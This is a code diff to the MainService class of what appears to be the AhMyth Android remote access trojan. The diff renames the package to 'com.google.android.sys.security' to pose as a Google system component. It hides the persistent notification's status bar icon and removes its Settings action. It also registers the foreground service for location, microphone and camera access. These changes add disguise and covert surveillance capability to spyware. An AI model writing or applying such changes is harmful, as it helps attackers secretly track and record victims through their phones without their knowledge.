@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
 import android.app.ActivityManager;
 import android.app.PendingIntent;
@@ -27,21 +27,26 @@ public class MainService extends Service {
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
     {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            String channelId = "ahmyth_service_channel";
+            String channelId = "sys_security_service_channel";
             String channelName = getString(R.string.service_channel_name);
-            // Tạo channel với IMPORTANCE_NONE để ẩn notification
-            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_NONE);
-            channel.setLightColor(android.graphics.Color.BLUE);
+            
+            // IMPORTANCE_MIN (1) keeps service alive but hides status bar icon on most devices
+            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN);
             channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
-            channel.enableVibration(false);
             channel.setShowBadge(false);
             
             android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
-                // Tạo notification ẩn, nhưng thêm action mở Settings
+                
+                // Compatibility for Android 12+ (Immutable PendingIntent)
+                int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                    pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
+                }
+
                 Intent settingsIntent = new Intent(this, SettingsActivity.class);
-                PendingIntent pendingSettings = PendingIntent.getActivity(this, 0, settingsIntent, PendingIntent.FLAG_UPDATE_CURRENT);
+                PendingIntent pendingSettings = PendingIntent.getActivity(this, 0, settingsIntent, pendingFlags);
 
                 android.app.Notification.Builder nb = new android.app.Notification.Builder(this, channelId)
                     .setOngoing(true)
@@ -50,16 +55,19 @@ public class MainService extends Service {
                     .setContentText(getString(R.string.service_notification_active))
                     .setPriority(android.app.Notification.PRIORITY_MIN)
                     .setCategory(android.app.Notification.CATEGORY_SERVICE)
-                    .setVibrate(new long[]{})
-                    .setSound(null)
-                    .setVisibility(android.app.Notification.VISIBILITY_SECRET)
-                    .addAction(android.R.drawable.ic_menu_manage, "Settings", pendingSettings);
+                    .setVisibility(android.app.Notification.VISIBILITY_SECRET);
 
                 android.app.Notification notification = nb.build();
-                startForeground(101, notification);
+                
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                    int serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+                    startForeground(101, notification, serviceType);
+                } else {
+                    startForeground(101, notification);
+                }
             }
-        } else {
-             // For older versions
         }
 
         contextOfApplication = this;
